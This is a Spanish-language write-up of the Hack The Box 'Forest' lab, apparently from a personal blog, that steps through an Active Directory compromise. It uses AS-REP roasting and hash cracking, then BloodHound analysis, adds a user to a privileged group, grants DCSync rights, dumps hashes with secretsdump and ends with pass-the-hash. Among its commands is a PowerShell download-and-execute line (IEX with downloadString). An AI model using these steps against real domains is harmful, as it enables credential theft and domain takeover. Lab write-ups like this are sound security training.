---
layout: post
title: Forest
parent: HackTheBox
---
# Forest
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---
{:.lead}

![](/assets/img/HTB_Forest/F0.png)

Esta maquina es de las primeras que nos sugiere la plataforma **Hack The Box**, para practicar **`Active Directory`**, es una maquina de dificultad **Easy**, pero aun asi... Tiene mucho que ofrecer.

Como siempre, comenzaremos con el **Port Scanning**:
![](/assets/img/HTB_Forest/F1.png)

Podemos apreciar que tendremos muchos puertos abiertos, por lo que podemos deducir que estamos contra un sistema operativo **Microsoft-Windows**, aunque esto tambien lo podemos saber por el TTL al momento de enviar un pauquete con el comando **ping**.

Nos queda ver los servicios y las versiones usadas para el servicio, por lo que tiramos del nmap:
```bash
nmap -sCV -p"Puertos" <IP>
```
![](/assets/img/HTB_Forest/F2.png)

Desde aqui ya podemos ir viendo datos interesantes, como lo puede ser un dominio **htb.local**, pero para asegurarnos usaremos herramientas de reconocimiento, como lo puede ser **Crackmapexec**
![](/assets/img/HTB_Forest/F3.png)

Podemos apreciar que se repite el mismo dominio: **"htb.local"**, por lo que lo podemos agregar al archivo del **/etc/hosts**, tambien vemos que posiblemente tengamos vias potenciales por el servicio **WinRM**.

Pero si queremos listar archivos o informacion por medio del SMB, no vamos a ver nada:
![](/assets/img/HTB_Forest/F4.png)

Aqui es donde entra una herramienta que nos trae por defecto sistemas como Parrot o Kali: **GetNPUsers.py**
![](/assets/img/HTB_Forest/F5.png)

Como nos reporta la informacion, vamos  a usar una de sus funciones, especificamente la primera, pero vamos a necesitar listar un usuario valido... Asi que lo vamos a listar sin pasarle ningun parametro:
![](/assets/img/HTB_Forest/F6.png)
Asi que ya  vamos a poder tener su TGT:
![](/assets/img/HTB_Forest/F7.png)
Entonces nos quedaria aplicarle Brute Force a al TGT que acabamos de obtener:
![](/assets/img/HTB_Forest/F8.png)
Vemos que tenemos credenciales para el usuario **svc-alfresco**, asi que veremos si nos da un **pwned** con Crackmapexec:

![](/assets/img/HTB_Forest/F9.png)

Usamos la herramienta **evil-winrm** para conectarnos usando las credenciales que acabamos de obtener:
![](/assets/img/HTB_Forest/F10.png)

Una vez lograda la intrusion como usuario de bajos privilegios, nos toca llegar al usuario administrador, por lo que necesitaremos de una herramienta que nos liste vias potenciales para logarlo... Aqui es donde entra **BloodHound**

Iniciaremos **Neo4j**, y luego abriremos BloodHound para vinculara a la base de datos del Neo4j.
![](/assets/img/HTB_Forest/F11.png)
Una vez en la maquina necesitaremos de una herramienta:

* [Sharphound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

La compartiremos a la maquina, existen varias formas... Yo use esta:

```powershell
Invoke-WebRequest -Uri "<IP>/SharpHound.ps1" -OutFile "Directorio en la maquina"
```
Otra puede ser:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://ruta-del-archivo/mi-script.ps1')
```

Como sea, lo ejecutamos y obtendremos informacion que cargaremos al BloodHound en formato **.zip**
![](/assets/img/HTB_Forest/F12.png)

Una vez cargado en el **BloodHound**, nos dirigimos al usuario del que tenemos credenciales para ver rutas que nos permitan elevar nuestros privilegios:
![](/assets/img/HTB_Forest/F13.png)

Si vemos la rama que nos lleva directamente al usuario administrador vemos que existe un privilegio que poseemos, este nos permite modificar el **DACL**.

![](/assets/img/HTB_Forest/F14.png)

BloodHound nos va a dar una pista de como conseguir escalar privilegios:

![](/assets/img/HTB_Forest/F15.png)

Primero, veremos los grupos disponibles:
![](/assets/img/HTB_Forest/F16.png)

* Vemos que tenemos disponible el "Exchange Windows Permissions"

Entonces lo que haremos a continuacion es crear un usuario y agregarlo a ese grupo:

```powershell
net user <Usuario> <Password> /add /domain
net group "NOMBRE DEL GRUPO" <usuario> /add
```
![](/assets/img/HTB_Forest/F17.png)

Nos quedaria aplicar lo que nos dice BloodHound:

```powershell
$SecPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\user', $SecPassword)
```

* Ahora bien, necesitaremos importar un binario en Powershell, [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

Una vez obtenido el binario, procuraremos a importarlo:

```powershell
Import-Module ./<Nombre del binario>
# Acto seguido Corremos el siguiente comando:
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'htb.local\Domain Admins' -PrincipalIdentity <Usuario> -Rights DCSync
```
![](/assets/img/HTB_Forest/F18.png)

Por lo que nos quedaria dumpear la informacion, empleando la herramienta **"secretsdump.py"**

```bash
secretsdump.py htb.local/<USER>@10.10.10.161
```
![](/assets/img/HTB_Forest/F19.png)

Como podemos ver, hemos dumpeado los hashes del administrador, por lo que ahora nos quedaria hacer un **"pass the hash"**:

![](/assets/img/HTB_Forest/F20.png)

# FIN
